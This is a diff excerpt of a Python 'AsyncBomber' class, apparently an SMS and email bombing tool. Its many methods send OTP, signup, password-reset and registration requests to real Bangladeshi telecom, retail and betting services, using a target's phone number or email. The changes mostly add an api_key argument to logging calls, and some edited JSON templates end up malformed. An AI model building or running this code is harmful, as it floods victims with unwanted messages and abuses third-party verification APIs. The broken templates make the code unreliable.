+            await self.log_event("API69 - Ghoori Learning", False, "Error", api_key="API69 - Ghoori Learning")
             return False
 
 
@@ -2565,10 +2569,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, json={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("API70 - Garibook", success, res.status)
+                await self.log_event("API70 - Garibook", success, res.status, api_key="API70 - Garibook")
                 return success
         except Exception:
-            await self.log_event("API70 - Garibook", False, "Error")
+            await self.log_event("API70 - Garibook", False, "Error", api_key="API70 - Garibook")
             return False
 
 
@@ -2578,10 +2582,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, json={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("API71 - Fabrilife Signup", success, res.status)
+                await self.log_event("API71 - Fabrilife Signup", success, res.status, api_key="API71 - Fabrilife Signup")
                 return success
         except Exception:
-            await self.log_event("API71 - Fabrilife Signup", False, "Error")
+            await self.log_event("API71 - Fabrilife Signup", False, "Error", api_key="API71 - Fabrilife Signup")
             return False
 
 
@@ -2591,10 +2595,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("API72 - Fabrilife OTP", success, res.status)
+                await self.log_event("API72 - Fabrilife OTP", success, res.status, api_key="API72 - Fabrilife OTP")
                 return success
         except Exception:
-            await self.log_event("API72 - Fabrilife OTP", False, "Error")
+            await self.log_event("API72 - Fabrilife OTP", False, "Error", api_key="API72 - Fabrilife OTP")
             return False
 
 
@@ -2604,10 +2608,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, data={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("API73 - BTCL BDIA", success, res.status)
+                await self.log_event("API73 - BTCL BDIA", success, res.status, api_key="API73 - BTCL BDIA")
                 return success
         except Exception:
-            await self.log_event("API73 - BTCL BDIA", False, "Error")
+            await self.log_event("API73 - BTCL BDIA", False, "Error", api_key="API73 - BTCL BDIA")
             return False
 
 
@@ -2617,10 +2621,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, json={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("API74 - BTCL PhoneBill Register", success, res.status)
+                await self.log_event("API74 - BTCL PhoneBill Register", success, res.status, api_key="API74 - BTCL PhoneBill Register")
                 return success
         except Exception:
-            await self.log_event("API74 - BTCL PhoneBill Register", False, "Error")
+            await self.log_event("API74 - BTCL PhoneBill Register", False, "Error", api_key="API74 - BTCL PhoneBill Register")
             return False
 
 
@@ -2630,10 +2634,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, json={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("API75 - BTCL PhoneBill Login", success, res.status)
+                await self.log_event("API75 - BTCL PhoneBill Login", success, res.status, api_key="API75 - BTCL PhoneBill Login")
                 return success
         except Exception:
-            await self.log_event("API75 - BTCL PhoneBill Login", False, "Error")
+            await self.log_event("API75 - BTCL PhoneBill Login", False, "Error", api_key="API75 - BTCL PhoneBill Login")
             return False
 
 
@@ -2643,10 +2647,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, json={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("API76 - RedX Merchant OTP", success, res.status)
+                await self.log_event("API76 - RedX Merchant OTP", success, res.status, api_key="API76 - RedX Merchant OTP")
                 return success
         except Exception:
-            await self.log_event("API76 - RedX Merchant OTP", False, "Error")
+            await self.log_event("API76 - RedX Merchant OTP", False, "Error", api_key="API76 - RedX Merchant OTP")
             return False
 
 
@@ -2656,10 +2660,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, data={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("API77 - KhaasFood Digits OTP", success, res.status)
+                await self.log_event("API77 - KhaasFood Digits OTP", success, res.status, api_key="API77 - KhaasFood Digits OTP")
                 return success
         except Exception:
-            await self.log_event("API77 - KhaasFood Digits OTP", False, "Error")
+            await self.log_event("API77 - KhaasFood Digits OTP", False, "Error", api_key="API77 - KhaasFood Digits OTP")
             return False
 
 
@@ -2669,10 +2673,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, json={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("API78 - Robi Web OTP", success, res.status)
+                await self.log_event("API78 - Robi Web OTP", success, res.status, api_key="API78 - Robi Web OTP")
                 return success
         except Exception:
-            await self.log_event("API78 - Robi Web OTP", False, "Error")
+            await self.log_event("API78 - Robi Web OTP", False, "Error", api_key="API78 - Robi Web OTP")
             return False
 
 
@@ -2682,10 +2686,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, json={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("API79 - Sindabad Offers OTP v2", success, res.status)
+                await self.log_event("API79 - Sindabad Offers OTP v2", success, res.status, api_key="API79 - Sindabad Offers OTP v2")
                 return success
         except Exception:
-            await self.log_event("API79 - Sindabad Offers OTP v2", False, "Error")
+            await self.log_event("API79 - Sindabad Offers OTP v2", False, "Error", api_key="API79 - Sindabad Offers OTP v2")
             return False
 
 
@@ -2695,10 +2699,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, json={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("API80 - GP FI FWA OTP", success, res.status)
+                await self.log_event("API80 - GP FI FWA OTP", success, res.status, api_key="API80 - GP FI FWA OTP")
                 return success
         except Exception:
-            await self.log_event("API80 - GP FI FWA OTP", False, "Error")
+            await self.log_event("API80 - GP FI FWA OTP", False, "Error", api_key="API80 - GP FI FWA OTP")
             return False
 
 
@@ -2708,10 +2712,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, json=json.loads('{"msisdn":"88{phone}","currentTimeLong":" + System.currentTimeMillis() + ","passKey":"GmIRDFRrRyoeLRYq"}'.replace('{phone}', target).replace('{target}', target).replace('{randomName}', get_random_name()).replace('{randomEmail}', get_random_email()).replace('{randomPhone}', get_random_phone())), headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("API81 - Kabbik OTP v2", success, res.status)
+                await self.log_event("API81 - Kabbik OTP v2", success, res.status, api_key="API81 - Kabbik OTP v2")
                 return success
         except Exception:
-            await self.log_event("API81 - Kabbik OTP v2", False, "Error")
+            await self.log_event("API81 - Kabbik OTP v2", False, "Error", api_key="API81 - Kabbik OTP v2")
             return False
 
 
@@ -2721,10 +2725,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, json={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("API82 - Sundora OTP Backend", success, res.status)
+                await self.log_event("API82 - Sundora OTP Backend", success, res.status, api_key="API82 - Sundora OTP Backend")
                 return success
         except Exception:
-            await self.log_event("API82 - Sundora OTP Backend", False, "Error")
+            await self.log_event("API82 - Sundora OTP Backend", False, "Error", api_key="API82 - Sundora OTP Backend")
             return False
 
 
@@ -2734,10 +2738,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, json=json.loads('{"auth":{"countryCode":"880","deviceUuid":"device-{phone}","phone":"{phone}","type":"LOGIN"},"captchaToken":"no recapcha"}'.replace('{phone}', target).replace('{target}', target).replace('{randomName}', get_random_name()).replace('{randomEmail}', get_random_email()).replace('{randomPhone}', get_random_phone())), headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("API83 - Walton Plaza OTP v2", success, res.status)
+                await self.log_event("API83 - Walton Plaza OTP v2", success, res.status, api_key="API83 - Walton Plaza OTP v2")
                 return success
         except Exception:
-            await self.log_event("API83 - Walton Plaza OTP v2", False, "Error")
+            await self.log_event("API83 - Walton Plaza OTP v2", False, "Error", api_key="API83 - Walton Plaza OTP v2")
             return False
 
 
@@ -2747,10 +2751,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, json={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("API84 - BTCL MyBTCL Register", success, res.status)
+                await self.log_event("API84 - BTCL MyBTCL Register", success, res.status, api_key="API84 - BTCL MyBTCL Register")
                 return success
         except Exception:
-            await self.log_event("API84 - BTCL MyBTCL Register", False, "Error")
+            await self.log_event("API84 - BTCL MyBTCL Register", False, "Error", api_key="API84 - BTCL MyBTCL Register")
             return False
 
 
@@ -2760,10 +2764,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, json={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("API85 - BTCL MyBTCL Bcare", success, res.status)
+                await self.log_event("API85 - BTCL MyBTCL Bcare", success, res.status, api_key="API85 - BTCL MyBTCL Bcare")
                 return success
         except Exception:
-            await self.log_event("API85 - BTCL MyBTCL Bcare", False, "Error")
+            await self.log_event("API85 - BTCL MyBTCL Bcare", False, "Error", api_key="API85 - BTCL MyBTCL Bcare")
             return False
 
 
@@ -2773,10 +2777,10 @@ class AsyncBomber:
         try:
             async with self.session.get(url, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("API86 - eCourier Individual OTP", success, res.status)
+                await self.log_event("API86 - eCourier Individual OTP", success, res.status, api_key="API86 - eCourier Individual OTP")
                 return success
         except Exception:
-            await self.log_event("API86 - eCourier Individual OTP", False, "Error")
+            await self.log_event("API86 - eCourier Individual OTP", False, "Error", api_key="API86 - eCourier Individual OTP")
             return False
 
 
@@ -2786,10 +2790,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, json={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("API87 - Carrybee Merchant Register", success, res.status)
+                await self.log_event("API87 - Carrybee Merchant Register", success, res.status, api_key="API87 - Carrybee Merchant Register")
                 return success
         except Exception:
-            await self.log_event("API87 - Carrybee Merchant Register", False, "Error")
+            await self.log_event("API87 - Carrybee Merchant Register", False, "Error", api_key="API87 - Carrybee Merchant Register")
             return False
 
 
@@ -2799,10 +2803,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, json={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("API88 - Carrybee Forget Password", success, res.status)
+                await self.log_event("API88 - Carrybee Forget Password", success, res.status, api_key="API88 - Carrybee Forget Password")
                 return success
         except Exception:
-            await self.log_event("API88 - Carrybee Forget Password", False, "Error")
+            await self.log_event("API88 - Carrybee Forget Password", False, "Error", api_key="API88 - Carrybee Forget Password")
             return False
 
 
@@ -2812,10 +2816,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, json={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("API89 - CartUp Signup", success, res.status)
+                await self.log_event("API89 - CartUp Signup", success, res.status, api_key="API89 - CartUp Signup")
                 return success
         except Exception:
-            await self.log_event("API89 - CartUp Signup", False, "Error")
+            await self.log_event("API89 - CartUp Signup", False, "Error", api_key="API89 - CartUp Signup")
             return False
 
 
@@ -2825,10 +2829,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, data={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("API90 - EasyFashion Digits OTP", success, res.status)
+                await self.log_event("API90 - EasyFashion Digits OTP", success, res.status, api_key="API90 - EasyFashion Digits OTP")
                 return success
         except Exception:
-            await self.log_event("API90 - EasyFashion Digits OTP", False, "Error")
+            await self.log_event("API90 - EasyFashion Digits OTP", False, "Error", api_key="API90 - EasyFashion Digits OTP")
             return False
 
 
@@ -2838,10 +2842,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, json={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("API91 - Sara Lifestyle OTP", success, res.status)
+                await self.log_event("API91 - Sara Lifestyle OTP", success, res.status, api_key="API91 - Sara Lifestyle OTP")
                 return success
         except Exception:
-            await self.log_event("API91 - Sara Lifestyle OTP", False, "Error")
+            await self.log_event("API91 - Sara Lifestyle OTP", False, "Error", api_key="API91 - Sara Lifestyle OTP")
             return False
 
 
@@ -2851,10 +2855,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, json={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("API92 - Electronics Bangladesh OTP", success, res.status)
+                await self.log_event("API92 - Electronics Bangladesh OTP", success, res.status, api_key="API92 - Electronics Bangladesh OTP")
                 return success
         except Exception:
-            await self.log_event("API92 - Electronics Bangladesh OTP", False, "Error")
+            await self.log_event("API92 - Electronics Bangladesh OTP", False, "Error", api_key="API92 - Electronics Bangladesh OTP")
             return False
 
 
@@ -2864,10 +2868,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, json={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("API93 - Esquire Electronics Check User", success, res.status)
+                await self.log_event("API93 - Esquire Electronics Check User", success, res.status, api_key="API93 - Esquire Electronics Check User")
                 return success
         except Exception:
-            await self.log_event("API93 - Esquire Electronics Check User", False, "Error")
+            await self.log_event("API93 - Esquire Electronics Check User", False, "Error", api_key="API93 - Esquire Electronics Check User")
             return False
 
 
@@ -2877,10 +2881,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, json={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("API94 - Sheba Electronics OTP", success, res.status)
+                await self.log_event("API94 - Sheba Electronics OTP", success, res.status, api_key="API94 - Sheba Electronics OTP")
                 return success
         except Exception:
-            await self.log_event("API94 - Sheba Electronics OTP", False, "Error")
+            await self.log_event("API94 - Sheba Electronics OTP", False, "Error", api_key="API94 - Sheba Electronics OTP")
             return False
 
 
@@ -2890,10 +2894,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, json={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("API95 - Sumash Tech OTP", success, res.status)
+                await self.log_event("API95 - Sumash Tech OTP", success, res.status, api_key="API95 - Sumash Tech OTP")
                 return success
         except Exception:
-            await self.log_event("API95 - Sumash Tech OTP", False, "Error")
+            await self.log_event("API95 - Sumash Tech OTP", False, "Error", api_key="API95 - Sumash Tech OTP")
             return False
 
 
@@ -2903,10 +2907,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, json={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("API96 - VolthBD Registration", success, res.status)
+                await self.log_event("API96 - VolthBD Registration", success, res.status, api_key="API96 - VolthBD Registration")
                 return success
         except Exception:
-            await self.log_event("API96 - VolthBD Registration", False, "Error")
+            await self.log_event("API96 - VolthBD Registration", False, "Error", api_key="API96 - VolthBD Registration")
             return False
 
 
@@ -2916,10 +2920,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, json={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("API97 - Rangs Shop OTP", success, res.status)
+                await self.log_event("API97 - Rangs Shop OTP", success, res.status, api_key="API97 - Rangs Shop OTP")
                 return success
         except Exception:
-            await self.log_event("API97 - Rangs Shop OTP", False, "Error")
+            await self.log_event("API97 - Rangs Shop OTP", False, "Error", api_key="API97 - Rangs Shop OTP")
             return False
 
 
@@ -2929,10 +2933,10 @@ class AsyncBomber:
         try:
             async with self.session.get(url, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("API98 - Eyecon App Transport", success, res.status)
+                await self.log_event("API98 - Eyecon App Transport", success, res.status, api_key="API98 - Eyecon App Transport")
                 return success
         except Exception:
-            await self.log_event("API98 - Eyecon App Transport", False, "Error")
+            await self.log_event("API98 - Eyecon App Transport", False, "Error", api_key="API98 - Eyecon App Transport")
             return False
 
 
@@ -2942,10 +2946,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, data={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("API99 - Vision Emporium Register", success, res.status)
+                await self.log_event("API99 - Vision Emporium Register", success, res.status, api_key="API99 - Vision Emporium Register")
                 return success
         except Exception:
-            await self.log_event("API99 - Vision Emporium Register", False, "Error")
+            await self.log_event("API99 - Vision Emporium Register", False, "Error", api_key="API99 - Vision Emporium Register")
             return False
 
 
@@ -2955,10 +2959,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, json=json.loads('{"mobileNum":"{phone}","operationType":5,"countryDialingCode":null}'.replace('{phone}', target).replace('{target}', target).replace('{randomName}', get_random_name()).replace('{randomEmail}', get_random_email()).replace('{randomPhone}', get_random_phone())), headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("API100 - BASA18 SMS", success, res.status)
+                await self.log_event("API100 - BASA18 SMS", success, res.status, api_key="API100 - BASA18 SMS")
                 return success
         except Exception:
-            await self.log_event("API100 - BASA18 SMS", False, "Error")
+            await self.log_event("API100 - BASA18 SMS", False, "Error", api_key="API100 - BASA18 SMS")
             return False
 
 
@@ -2968,10 +2972,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, json={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("API101 - PKLuck Register", success, res.status)
+                await self.log_event("API101 - PKLuck Register", success, res.status, api_key="API101 - PKLuck Register")
                 return success
         except Exception:
-            await self.log_event("API101 - PKLuck Register", False, "Error")
+            await self.log_event("API101 - PKLuck Register", False, "Error", api_key="API101 - PKLuck Register")
             return False
 
 
@@ -2981,10 +2985,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, json={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("API102 - PKLuck NoLogin OTP", success, res.status)
+                await self.log_event("API102 - PKLuck NoLogin OTP", success, res.status, api_key="API102 - PKLuck NoLogin OTP")
                 return success
         except Exception:
-            await self.log_event("API102 - PKLuck NoLogin OTP", False, "Error")
+            await self.log_event("API102 - PKLuck NoLogin OTP", False, "Error", api_key="API102 - PKLuck NoLogin OTP")
             return False
 
 
@@ -2992,12 +2996,12 @@ class AsyncBomber:
         target = self.target
         url = f"https://www.8mbets.net/api/register/verify".replace("{phone}", target)
         try:
-            async with self.session.post(url, json=json.loads('{"username":"user{phone}","email":"","mobileno":"{phone}","new_password":"Password@123","confirm_new_password":"Password@123","currency":"BDT","language":"bn","langCountry":"bn-bd"}'.replace('{phone}', target).replace('{target}', target).replace('{randomName}', get_random_name()).replace('{randomEmail}', get_random_email()).replace('{randomPhone}', get_random_phone())), headers=self.get_headers(url), timeout=10) as res:
+            async with self.session.post(url, json=json.loads('{"username":"user{phone}","email":","mobileno":"{phone}","new_password":"Password@123","confirm_new_password":"Password@123","currency":"BDT","language":"bn","langCountry":"bn-bd"}'.replace('{phone}', target).replace('{target}', target).replace('{randomName}', get_random_name()).replace('{randomEmail}', get_random_email()).replace('{randomPhone}', get_random_phone())), headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("API103 - 8MBets Register", success, res.status)
+                await self.log_event("API103 - 8MBets Register", success, res.status, api_key="API103 - 8MBets Register")
                 return success
         except Exception:
-            await self.log_event("API103 - 8MBets Register", False, "Error")
+            await self.log_event("API103 - 8MBets Register", False, "Error", api_key="API103 - 8MBets Register")
             return False
 
 
@@ -3007,10 +3011,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, json=json.loads('{"type":"verify-mobile","username":"user{phone}","language":"bn","langCountry":"bn-bd"}'.replace('{phone}', target).replace('{target}', target).replace('{randomName}', get_random_name()).replace('{randomEmail}', get_random_email()).replace('{randomPhone}', get_random_phone())), headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("API104 - 8MBets New Mobile Request", success, res.status)
+                await self.log_event("API104 - 8MBets New Mobile Request", success, res.status, api_key="API104 - 8MBets New Mobile Request")
                 return success
         except Exception:
-            await self.log_event("API104 - 8MBets New Mobile Request", False, "Error")
+            await self.log_event("API104 - 8MBets New Mobile Request", False, "Error", api_key="API104 - 8MBets New Mobile Request")
             return False
 
 
@@ -3020,10 +3024,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, json=json.loads('{"type":"forget","method":"mobileno","value":"880{phone}","key":"mobileno","language":"bn","langCountry":"bn-bd"}'.replace('{phone}', target).replace('{target}', target).replace('{randomName}', get_random_name()).replace('{randomEmail}', get_random_email()).replace('{randomPhone}', get_random_phone())), headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("API105 - 8MBets Forget TAC", success, res.status)
+                await self.log_event("API105 - 8MBets Forget TAC", success, res.status, api_key="API105 - 8MBets Forget TAC")
                 return success
         except Exception:
-            await self.log_event("API105 - 8MBets Forget TAC", False, "Error")
+            await self.log_event("API105 - 8MBets Forget TAC", False, "Error", api_key="API105 - 8MBets Forget TAC")
             return False
 
 
@@ -3031,12 +3035,12 @@ class AsyncBomber:
         target = self.target
         url = f"https://www.jayabaji3.com/api/register/confirm".replace("{phone}", target)
         try:
-            async with self.session.post(url, json=json.loads('{"mobileno":"{phone}","username":"user{phone}","firstname":"","new_password":"Password@123","confirm_new_password":"Password@123","country_code":"880","country":"BD","currency":"BDT","ref":"","language":"en","langCountry":"en-bd"}'.replace('{phone}', target).replace('{target}', target).replace('{randomName}', get_random_name()).replace('{randomEmail}', get_random_email()).replace('{randomPhone}', get_random_phone())), headers=self.get_headers(url), timeout=10) as res:
+            async with self.session.post(url, json=json.loads('{"mobileno":"{phone}","username":"user{phone}","firstname":","new_password":"Password@123","confirm_new_password":"Password@123","country_code":"880","country":"BD","currency":"BDT","ref":","language":"en","langCountry":"en-bd"}'.replace('{phone}', target).replace('{target}', target).replace('{randomName}', get_random_name()).replace('{randomEmail}', get_random_email()).replace('{randomPhone}', get_random_phone())), headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("API106 - Jayabaji Register", success, res.status)
+                await self.log_event("API106 - Jayabaji Register", success, res.status, api_key="API106 - Jayabaji Register")
                 return success
         except Exception:
-            await self.log_event("API106 - Jayabaji Register", False, "Error")
+            await self.log_event("API106 - Jayabaji Register", False, "Error", api_key="API106 - Jayabaji Register")
             return False
 
 
@@ -3046,10 +3050,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, json=json.loads('{"type":"verify-mobile","username":"user{phone}","language":"en","langCountry":"en-bd"}'.replace('{phone}', target).replace('{target}', target).replace('{randomName}', get_random_name()).replace('{randomEmail}', get_random_email()).replace('{randomPhone}', get_random_phone())), headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("API107 - Jayabaji New Mobile Request", success, res.status)
+                await self.log_event("API107 - Jayabaji New Mobile Request", success, res.status, api_key="API107 - Jayabaji New Mobile Request")
                 return success
         except Exception:
-            await self.log_event("API107 - Jayabaji New Mobile Request", False, "Error")
+            await self.log_event("API107 - Jayabaji New Mobile Request", False, "Error", api_key="API107 - Jayabaji New Mobile Request")
             return False
 
 
@@ -3059,10 +3063,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, json=json.loads('{"uname":"880{phone}","sendType":"mobile","country_code":"880","currency":"BDT","mobileno":"{phone}","language":"en","langCountry":"en-bd"}'.replace('{phone}', target).replace('{target}', target).replace('{randomName}', get_random_name()).replace('{randomEmail}', get_random_email()).replace('{randomPhone}', get_random_phone())), headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("API108 - Jayabaji Login TAC", success, res.status)
+                await self.log_event("API108 - Jayabaji Login TAC", success, res.status, api_key="API108 - Jayabaji Login TAC")
                 return success
         except Exception:
-            await self.log_event("API108 - Jayabaji Login TAC", False, "Error")
+            await self.log_event("API108 - Jayabaji Login TAC", False, "Error", api_key="API108 - Jayabaji Login TAC")
             return False
 
     # Email APIs
@@ -3073,10 +3077,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, json=json.loads('{"account":{"profile":{"name":"{randomName}","opt_out":false},"login":{"email":"{phone}","password":"Sojib12345"}}}'.replace('{phone}', target).replace('{target}', target).replace('{randomName}', get_random_name()).replace('{randomEmail}', get_random_email()).replace('{randomPhone}', get_random_phone())), headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("EMAIL1 - Bikroy Account", success, res.status)
+                await self.log_event("EMAIL1 - Bikroy Account", success, res.status, api_key="EMAIL1 - Bikroy Account")
                 return success
         except Exception:
-            await self.log_event("EMAIL1 - Bikroy Account", False, "Error")
+            await self.log_event("EMAIL1 - Bikroy Account", False, "Error", api_key="EMAIL1 - Bikroy Account")
             return False
 
 
@@ -3086,10 +3090,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, json=json.loads('{"email":"{phone}"}'.replace('{phone}', target).replace('{target}', target).replace('{randomName}', get_random_name()).replace('{randomEmail}', get_random_email()).replace('{randomPhone}', get_random_phone())), headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("EMAIL2 - Bikroy Password Reset", success, res.status)
+                await self.log_event("EMAIL2 - Bikroy Password Reset", success, res.status, api_key="EMAIL2 - Bikroy Password Reset")
                 return success
         except Exception:
-            await self.log_event("EMAIL2 - Bikroy Password Reset", False, "Error")
+            await self.log_event("EMAIL2 - Bikroy Password Reset", False, "Error", api_key="EMAIL2 - Bikroy Password Reset")
             return False
 
 
@@ -3099,10 +3103,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, json=json.loads('{"first_name":"Md","last_name":"SOJIB","email":"{phone}","password":"Sojib12345","confirmed_password":"Sojib12345","email_opt_in":false,"locale":"en"}'.replace('{phone}', target).replace('{target}', target).replace('{randomName}', get_random_name()).replace('{randomEmail}', get_random_email()).replace('{randomPhone}', get_random_phone())), headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("EMAIL3 - Busbud Signup", success, res.status)
+                await self.log_event("EMAIL3 - Busbud Signup", success, res.status, api_key="EMAIL3 - Busbud Signup")
                 return success
         except Exception:
-            await self.log_event("EMAIL3 - Busbud Signup", False, "Error")
+            await self.log_event("EMAIL3 - Busbud Signup", False, "Error", api_key="EMAIL3 - Busbud Signup")
             return False
 
 
@@ -3112,10 +3116,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, data={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("EMAIL4 - Mithaibd Register", success, res.status)
+                await self.log_event("EMAIL4 - Mithaibd Register", success, res.status, api_key="EMAIL4 - Mithaibd Register")
                 return success
         except Exception:
-            await self.log_event("EMAIL4 - Mithaibd Register", False, "Error")
+            await self.log_event("EMAIL4 - Mithaibd Register", False, "Error", api_key="EMAIL4 - Mithaibd Register")
             return False
 
 
@@ -3125,10 +3129,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, json=json.loads('{"userContactNo":"{phone}","userType":"customer","actionFor":"r"}'.replace('{phone}', target).replace('{target}', target).replace('{randomName}', get_random_name()).replace('{randomEmail}', get_random_email()).replace('{randomPhone}', get_random_phone())), headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("EMAIL5 - Saralifestyle Reset", success, res.status)
+                await self.log_event("EMAIL5 - Saralifestyle Reset", success, res.status, api_key="EMAIL5 - Saralifestyle Reset")
                 return success
         except Exception:
-            await self.log_event("EMAIL5 - Saralifestyle Reset", False, "Error")
+            await self.log_event("EMAIL5 - Saralifestyle Reset", False, "Error", api_key="EMAIL5 - Saralifestyle Reset")
             return False
 
 
@@ -3138,10 +3142,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, data={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("EMAIL6 - Tohfay Register", success, res.status)
+                await self.log_event("EMAIL6 - Tohfay Register", success, res.status, api_key="EMAIL6 - Tohfay Register")
                 return success
         except Exception:
-            await self.log_event("EMAIL6 - Tohfay Register", False, "Error")
+            await self.log_event("EMAIL6 - Tohfay Register", False, "Error", api_key="EMAIL6 - Tohfay Register")
             return False
 
 
@@ -3151,10 +3155,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, data={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("EMAIL7 - Tohfay Forgot", success, res.status)
+                await self.log_event("EMAIL7 - Tohfay Forgot", success, res.status, api_key="EMAIL7 - Tohfay Forgot")
                 return success
         except Exception:
-            await self.log_event("EMAIL7 - Tohfay Forgot", False, "Error")
+            await self.log_event("EMAIL7 - Tohfay Forgot", False, "Error", api_key="EMAIL7 - Tohfay Forgot")
             return False
 
 
@@ -3164,10 +3168,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, data={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("EMAIL8 - MrMedicineMart Signup", success, res.status)
+                await self.log_event("EMAIL8 - MrMedicineMart Signup", success, res.status, api_key="EMAIL8 - MrMedicineMart Signup")
                 return success
         except Exception:
-            await self.log_event("EMAIL8 - MrMedicineMart Signup", False, "Error")
